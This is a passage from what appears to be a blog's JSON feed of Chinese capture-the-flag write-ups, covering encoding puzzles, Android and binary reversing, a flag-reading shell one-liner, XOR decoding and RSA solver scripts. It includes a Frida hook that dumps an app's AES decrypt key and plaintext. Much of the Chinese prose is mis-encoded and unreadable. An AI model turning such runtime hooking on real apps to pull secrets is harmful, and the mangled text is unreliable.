ZWlVkR2FrMVdXbmxYYTJSdlZHeGFWVkpVUWxkV1JWcDJXV3BLUjJNeFRuTmhSbHBwVmpKb1dGZFhlRzlVYlZaSFYxaGtXR0pJUW5KVVZscDNaVlp3UmxaVVJtaFdhM0F4VlZab2ExZEhTa2RYYmtaVllrZFNSMXBFUVhoV01XUnlUbFprVTJFelFscFdiVEIzWlVkSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVZa1phTUZwVlpFZGhSbHB5WWtSU1ZtSkhhSEpXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXWVdFeVVsZFdiazVWWWxkNFZGUldWbmRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVdGSVRsWmhhelZFVmxWYVlXUkhWa2xVYXpsVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKdGVHRldiRnAzWkd4YWNWTnJaR3BoZWxaWVZrY3hSMVV4U2xkalJGcFhZbGhDU0ZkV1dtdFhSa3B5V2tkb1UyRjZWbmRXVnpBeFVXc3hjMWRZYUZoaVIxSmhWbXBDVjA1R1dsaE9WVGxZVW0xU1NWcFZZelZXYlVWNFYycE9WMDFHY0ZSV2FrWnJaRlp3U0dGR1RtbFNiWFExVm14amVFMUZNVWhTYmtwT1ZtMVNWVmxYZEdGWFJscHhWRzA1VmxKdGVGaFdNblIzWWtaS2NrNVVSbGhoTVhCeVdWWmFhMUl4VG5OaVJtUnBWa1ZKTUZac1kzaFdNVWw0WTBWc1YySkZOWEJWYkdoRFpERmFkR1ZIUm10TmJFcDZWakowYTFsV1RrbFJhemxYWVd0YWFGcFhlRnBsUjBaSlZHeFdUbFp1UWpWV1IzaHFUbFphVjFkdVRsaGhhelZXVm14YWQyRkdXWGRXVkVaWFlrWktlbGRyVlRGaFJUQjNVMnQwVjAxV2NGaFdha1pXWlVaa2MyRkdVbWhOYkVwNFZsZHdTMkl4V1hoVmJGcGhVbXMxV1ZWdGVGZE5NVmw1WkVSQ2FFMVZiRE5VYkZaclZsZEtSMk5JU2xkU00yaG9WakJrVW1WdFRrZGFSMnhZVWpKb1ZsWnNhSGRSYlZaSFZHdGtWR0pIZUc5VmFrSmhWa1phY1ZOdE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldWRlpIZUdGT2JVcElVbXhrYVZaRlZYZFdiVEUwVmpKU1JrNVdhR3RTYkZwdldsZDBZVmRXWkZoa1JrNVZUVlpzTTFSV2FFZFdNa1Y2WVVkR1dsWkZXak5XUlZwM1VteGtjMXBIZEZkTlNFSktWbGN4TkZReFdYZE5WbHBZVjBoQ1dGbHNhRzlXUmxZMlVtdDBhMUpzY0RGV1IzaFBZVmRGZUdOR2NGaFdNMUp5VmxSS1QxSXhXblZTYkU1b1RWaENlVlpHV210Vk1XUkhWMnhvYTFKRlNsZFVWVkpIVjBac2NsVnNUbGROVlc4eVZtMTRRMWRHV25OalJYUmhWbTFTU0ZWdGN6VldNVnB6V2tVMVRtSlhhRTlXYlRGM1VqRnNXRkpZYUdGU1YyaFlXVlJLYjFWV1duUmtTR1JWVFZad01GcEZhR3RXUmxwelkwaHdXRmRJUWtoV2ExVjRWMFpXY21KR1drNWliRXB2VjFaa05GUXhTbkpPVm1Sb1VtNUNjRlZxU205V1ZscEhWV3RrYTAxV2JEUlhhMmhUWVRGSmVsRnVRbFpoYTFwTVZHMTRZV05zY0VWVmJXeE9WbXhaTVZaWGVHOWpNa1Y1Vm01S1dHSkhlRmhaYkdodllVWnNWbGR1WkZOV2EzQXdXa1ZhVDFSc1dYaFRhbEpYWVd0dk1GVjZSbXRTTVU1WllrZG9VMkpYYUZsWFYzaHZWVEZrUjFwR1pHRlNWR3h4VkZaYWQwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcDBWVmhrV0Zac2NFdGFWVnBYVjFkR1IyRkhiRmhTYTNBeVZteGtkMUl4YkZoV2JrNVlWMGQ0YzFWc1pGTlhSbEpZWkVaa1QxSnRkRE5YYTJNMVYwWktjMk5FUWxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVVsNVVtdGtWV0Y2Vms5WmJHUnFaVVphZEUxVVVtaE5iRVkwVld4b2IyRldTblJoUmxwYVZrVndWRll3V25Oa1IxWkdaRWR3VGxac1dYcFdNblJoVkRKR2NrMVdhR3hUUjNoWVZGYzFiMk5zV2tWU2JVWnJWbXRhZWxkclduZFdNVmw0VW1wT1YyRnJTbWhWTWpGU1pWWlNjbGR0YUZOaWEwcFFWbGN3TVZFd01YTlhia1pVWW01Q2MxVnRjekZUVmxaMFpFZEdhVkpyY0RCV1Z6QTFWMnhhUms1VlVsWk5WbkJ5Vm14YVQyTldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZsUmEzQllZVEZ3VUZaSGVHRmtSMUkyVW14a2FFMVlRakpYV0hCSFZtMVdWMU5zYkdsU01taFZWV3hXZDFkR1pGaGxSemxWWWxaYVNGbFVUbXRYUjBwSFkwaEtWVlpzY0ROYVZscDNVbXhhVlZKdGFGZGhNMEY0Vmxaa2QxVXhXWGhYYTFwcVVrVTFWMVpyVm1GaFJtdDVZek5vVjAxWFVqQlphMXBQVlRKRmVsRnNjRmRpUjA0eldsVmtTbVZXV25WVWJHaHBZWHBXV2xkWGVHOVZNVnBYVm01R1UySlZXbFZWYlhoelRsWndWbUZIZEZkTlJFWlhXVEJhYjFkdFJuSk9WRTVYVFVad1lWcFhlRWRqYlVaSFdrZG9hRTB3U2xKV2JURjNVakZaZVZWc1pGVmlhelZZV1d4a05GWkdVbGRXYm1SWFlrWnNORmRyVWxOaFZURnlZa1JPVldKR2NISldNR1JMWXpGT2NrOVdXbWhOVm5CdlYxZHdSMVV4V1hoYVNGWlZZWHBzVkZsclpETk5WbHBJWlVaYVQxWXdXa2xWTW5SaFlXeEtXRlZzWkZWV00wSklXa2Q0WVdSRk1WWmtSbEpUWWtad05sWnNaRFJaVmxKelUyNVdVbUpYYUZsWmExcDNZMnhhY1ZKck9WTk5WVFV4VmxjeE1GVXlSalpXYm1SWFZucEJlRlZYYzNoV01XUlpZVVpvYVZJeFNtaFdiWEJEVmpBMVIxZHNhRTlXYXpWWFZGZDBkMlZXVW5OWGJrNVlZbFZXTkZrd1pHOVdNREZIWTBod1YySkdjRkJaZWtaUFkyczFWMVJ0YkZOaVdGRXhWbTE0YW1WRk1VWk5WV2hUWW10d1QxWnRNVFJWTVd4VlZHdE9XRkp0ZUhwWlZXTTFWakZLZEdWR2FGZE5ibEYzV1ZkemVHTnJOVlpoUm5Cb1RWaENNbFp0Y0VKa01sWkhWRzVHVkdKSFVsaFphMVozVWtaYVIxZHRkRlZpVmxwSVdUQldjMVpIU2xoaFJsSlZWa1Z3ZGxac1dtRlNNVnAwVW0xMFRtRXhjRWxXYWtreFZURlNjMVJyYUdoU2JWSldWbTE0WVdWc1VuSlhiVVpZVWxSV1YxUXhXbTlWTURGSlVXeG9WMkZyYnpCWlZFWmhaRVpPYzJKSGFGTlNWRlpYVm0xNFlXUXlSa2RYV0dSWFZrVmFXRmxyV2t0bGJHUnlWbFJHYUZKVVFqTlZNblF3VmpBeFYyTkdhRmRoYTFwWFdsVmFhMk15UmtkVmJXaE9Za1Z3TkZac1pIZFRNa2w0VjFob1ZtSkdjR2hWYlhNeFYxWldkR1ZHWkU1TlZtdzFXa1ZTUTJGRk1WWmlSRTVWWWtaYWNsWnNaRXRTTWs1SlUyeGtVMDB5YUc5V2FrSnJWVzFXZEZSclpHRlNNbmhaVldwS2IxWnNXbk5oU0dSU1lsWmFTRlpIZEd0V1YwcElaVWhDVm1KWVRYaFpha1pUVjBkV1JtUkdaR2xTTVVwYVZrWmFiMlF4VW5OWGJrNXFVbTFvWVZsVVNtOVZSbHB4VTJ0MFYySkhVbnBaVlZwM1lVVXhXVkZZY0ZkU2JGcG9Xa1JHWVdSR1NuSmhSM1JUWWtad2RsZHNaREJaVm1SeldraE9WMkpWV205VVZscHpUVEZTVjJGRlpGZE5hM0I1V1RCYWIxWXlSWGhYYWs1WFVsWndWMXBWV210amJIQklZMGRzVkZKVmNFcFdiVEI0WldzeFYxZFliRlJoTWxKWVdWZDRTMWRHVWxkWGJtUm9VbTFTV0ZZeWN6RmlSa3AxVVd0b1dHRXhjRkJaVm1SR1pVZE9SMk5HYUZkTk1VcDVWMWR3UjJFeFNYbFRhMnhVWWtkb2NGbHNXa3RsYkZwMFRVaG9WazFYVW5wWlZFNXJWakpLV1ZWc2FGVldNMUl6VmpCYVYyUkhUa1pQVm1SWFlraENObGRVUW05VE1WbDNUVlZvVm1FemFGaFVWV1JUVjBaVmVGZHNUbXBOYXpWSVYydGFUMVl5U2xWaGVrcFhZbFJHTTFWcVJuTlhSa3BaWVVkR1UxWXlhRmxYVmxKTFlqRldWMWR1VW10VFIxSldWRlphZDAxR2NFWmhSM1JYVW14d2Vsa3dhSGRYUjBWNFUyeFNWMDF1YUdoYVJXUlhVakpHUjFkck5XbGlWMmcxVmpGYWEwNUdVWGhUYmtwUFZtMVNhRlZ0TlVOalJsWjBaRWhrVkZac2NEQmFSV1JIVjBkS1YxZHNiRmRpV0ZKNlZteGtTMWRXUm5WUmJGcG9ZVEZ3VFZaSE1UUlpWMDV6WVROd2FGSXllRTlXYlhoYVRVWmFjVk5xUWxwV2JWSkpWVzAxVDJGc1NuUmhSbWhhVmtWYWFGcFdXbmRXYkdSMVZHMXdWMkV6UWpaWFZFSnJUa1pWZVZOc1pGUmlWVnBaVm10V1MyTnNiSEZTYkZwclRVUkdXbFpYTVc5Vk1sWjBaVVpzVjJKWVFsQldWRVpyVWpGd1IxcEdhR2xoZWxaWlZrWmtlazFXVGtkWFdHeHNVbnBzYjFadE1WTlRSbFY1VGxoT1YwMXJjRlpWYkZKRFYwWmFjMVpxVWxaaGEzQlFWV3BHYTJNeVJraGhSM2hwVjBkb2FGWnRlR3BsUlRGSVZWaHNWMkpIVW05VVZFcFRWMVpzZEUxV1RsaFNiRXBaV2tWYWExUXhTblJrUkU1WVlUSk5NVll3V2t0ak1rNUpZMFp3VGxJeVozcFdiWEJMVWpKT2MxcElUbFppU0VKUFdXMHhibVZzV2xoalJXUnJUVlUxU1ZVeWRHOWhSa2w2WVVoQ1ZtSlVWa1JYVmxwaFpFZE9SbHBIYUdsV2JIQktWbTB3TVZNeFVuTlhibEpXWWtkNFdGUlZaRk5rYkZsNFYyNU9hMUl4V2tkYVJXUjNWR3hhYzJORVVsZFdiVTQwVldwR2ExSXhUblZWYlhoVVVqTm9XVlpHWXpGVmJWRjRWMjVHVWxkSGFGaFVWM014VTBac2NsZHNaR2hXYTNCNldXdFNUMVl5U2xWU1ZFSllWbTFTVDFwVlduZFRWbEp6WVVkc1UySklRbHBXYlRCNFRVZFJkMDVXWkZoaVJuQlpXVlJHZDFWV1duUmtSWFJXVFZaYVNGWldhR3RWVmxaVlRVUnJQUT09\n</code></pre>\n<p>Ëß£ base64</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/13.png\" alt=\"img\"></p>\n<p>atbash_cipher Âíå string_reverserever</p>\n<pre><code class=\"language-Bash\">ntio&#123;lmi8i56k1lkn73im7ni75k52in41jj70&#125;\n</code></pre>\n<p>Caesar 8</p>\n<pre><code class=\"language-Bash\">flag&#123;dea8a56c1dcf73ae7fa75c52af41bb70&#125;\n</code></pre>\n<h2 id=\"reverse\"><a class=\"markdownIt-Anchor\" href=\"#reverse\">#</a> Reverse</h2>\n<h3 id=\"babyre\"><a class=\"markdownIt-Anchor\" href=\"#babyre\">#</a> BabyRe</h3>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/14.png\" alt=\"img\"></p>\n<p>ËµõÂçöÂé®Â≠êÂó¶Âìà</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/15.png\" alt=\"img\"></p>\n<h3 id=\"tea\"><a class=\"markdownIt-Anchor\" href=\"#tea\">#</a> TEA</h3>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/16.png\" alt=\"img\"></p>\n<p>‰∏çÁü•ÈÅìÂï•ÊÉÖÂÜµÔºåÊâìÂºÄÂ∞±ÊòØ flagÔºåËØï‰∫ÜÔºåËøòÁúüÊòØ</p>\n<h3 id=\"easyre\"><a class=\"markdownIt-Anchor\" href=\"#easyre\">#</a> EasyRe</h3>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/17.png\" alt=\"img\"></p>\n<p>Ëá™Â∏¶Ëß£ÂØÜÂáΩÊï∞</p>\n<pre><code class=\"language-JavaScript\">Java.perform(function () &#123;\n\n   var aESUtils =Java.use(&quot;com.example.easyre.AESUtils&quot;);\n    aESUtils.decrypt.implementation=function (a,b)&#123;\n\n\n       console.log(&quot;miwen:&quot;,a);\n       console.log(&quot;key&quot;, b);\n\n       var srcret = this.decrypt(a,b);\n       console.log(&quot;Âä†ÂØÜÂêé:&quot;,srcret);\n       return srcret;\n&#125;\n\n&#125;);\n</code></pre>\n<p>hook Âá∫Êù•ÁÑ∂ÂêéÁõ¥Êé•ÁúãÂØÜÊñá</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/18.png\" alt=\"img\"></p>\n<p>base64 Ëß£ÂØÜ</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/19.png\" alt=\"img\"></p>\n<h3 id=\"gorc\"><a class=\"markdownIt-Anchor\" href=\"#gorc\">#</a> GORC</h3>\n<p>Âä®Ë∞ÉÂá∫ key</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/20.png\" alt=\"img\"></p>\n<p>Áõ¥Êé•Ëß£ÂØÜ</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/21.png\" alt=\"img\"></p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/10/24/FSCTF-wp/",
            "url": "http://example.com/2023/10/24/FSCTF-wp/",
            "title": "FSCTF_wp",
            "date_published": "2023-10-24T01:31:05.000Z",
            "content_html": "<h1 id=\"fsctf\"><a class=\"markdownIt-Anchor\" href=\"#fsctf\">#</a> FSCTF</h1>\n<p>RAND:12</p>\n<p><img data-src=\"/img/fsctfwppic/1.png\" alt=\"image-20231024075145656\"></p>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> web</h2>\n<h3 id=\"Ê∫êÁ†ÅÂêØÂä®\"><a class=\"markdownIt-Anchor\" href=\"#Ê∫êÁ†ÅÂêØÂä®\">#</a> Ê∫êÁ†ÅÔºÅÂêØÂä®ÔºÅ</h3>\n<p>CTRL+U Êü•ÁúãÊ∫êÁ†Å</p>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> pwn</h2>\n<h3 id=\"nc\"><a class=\"markdownIt-Anchor\" href=\"#nc\">#</a> nc</h3>\n<pre><code>tac fl* &gt;&amp;2\n</code></pre>\n<h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> re</h2>\n<h3 id=\"xor\"><a class=\"markdownIt-Anchor\" href=\"#xor\">#</a> Xor</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"t~suiFz&#123;aM&#123;aMsMwsakM`wdw`awo\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> crypto</h2>\n<h3 id=\"rsa-1\"><a class=\"markdownIt-Anchor\" href=\"#rsa-1\">#</a> RSA 1</h3>\n<pre><code>p=1458769258361\nq=4556983871563\ne=17\nÊ±Çd\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ÂÅö‰∏çÂá∫Êù•Â∞±Âà´Èò¥Èò≥ÊÄ™Ê∞îÂï¶\"><a class=\"markdownIt-Anchor\" href=\"#ÂÅö‰∏çÂá∫Êù•Â∞±Âà´Èò¥Èò≥ÊÄ™Ê∞îÂï¶\">#</a> ÂÅö‰∏çÂá∫Êù•Â∞±Âà´Èò¥Èò≥ÊÄ™Ê∞îÂï¶</h3>\n<pre><code>Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü ‰∏ç ‰ºö Âêß Ôºü Â∞± Ëøô ¬ø ‰∏ç ‰ºö Âêß Ôºü \n</code></pre>\n<blockquote>\n<p>Èò¥Èò≥ÊÄ™Ê∞îËß£ÂØÜ</p>\n</blockquote>\n<pre><code>FSCTF&#123;Jiuzhe@JustSoSo&#125;\n</code></pre>\n<h3 id=\"rsa-2\"><a class=\"markdownIt-Anchor\" href=\"#rsa-2\">#</a> RSA 2</h3>\n<pre><code>c=90362297576572826064831133206230135349790392078780406000643496612200873754835039374184323808342127071833274981191134125413478105835272238356352724573228797863805124195170088819735610736936895478614898105848968069280022022112207095140266709372221090586917729998024205978412679448008696923580889787529663283314\np=8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 \nq=11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407\ne=65537\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"rsa3\"><a class=\"markdownIt-Anchor\" href=\"#rsa3\">#</a> RSA3</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> bytes_to_long</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>m<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n<span class=\"token operator\">=</span> <span class=\"token number\">12308543373374311860115195114269947739026255098864232126071500623399852788903738569949462616714391748269539072128882946132686996592089735285396762634029371785959865779256901123369306119124563405765293657606975290441243965513640680841871955014230301486214824204887945375140818283280272607903500556306646445508386218951500563603482945071727344737690804338144982687000734071274618240408238519378280819162796749148066754028700125846348589164721591354555019608871411236973606149388257533629388508942271702742078883636357856776193846813894734271905070538713351614750057245897158615891962167410053552739441195871000310777649</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>dp<span class=\"token operator\">=</span> <span class=\"token number\">28196759050232165736649945458463681080421101473761579424309687746007021074159564720195299959516638110870101025657932732247788828322476803386736345945717104030991724584628153257976163663460034720811420324255626233108130037584679035250792445830510130682783638394418531763109219293027733347554816808577799709553</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c<span class=\"token operator\">=</span> <span class=\"token number\">1855798257044238280327042455832785889763141234883180404158555071443088630113034033050409259513632343742665544043437830959750873431928980910236398026670945184328950692568113819821699696418438157336263799808404698795433243968536256780396910914692949484556950491722527661706255009863481905590371725089587377065000354109396062360440021447607401687082247775453369117424848927386857425051097931983703966253652921113920387008048024308793686643944404541941182997963873579988680965558581885273185721576668001462817150245955628293258512024323515581063235248627223179117549540541642185815489978089367061102920114395871329023208</span></pre></td></tr></table></figure><blockquote>\n<p>dp 